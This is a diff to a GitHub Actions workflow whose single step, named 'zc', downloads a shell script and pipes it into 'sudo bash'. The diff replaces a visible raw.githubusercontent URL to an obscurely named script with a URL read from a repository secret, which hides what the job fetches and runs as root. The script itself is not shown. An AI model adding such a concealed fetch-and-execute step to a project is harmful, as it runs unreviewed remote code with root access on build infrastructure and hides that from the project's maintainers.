@@ -7,4 +7,6 @@ jobs:
     runs-on: ubuntu-latest
     steps:
     - name: zc
-      run: curl https://raw.githubusercontent.com/zsdresd/fmli/master/a/a/a/ashid/fm.sh | sudo bash
+      env:
+        SH: ${{ secrets.YOU }}
+      run: curl $SH | sudo bash
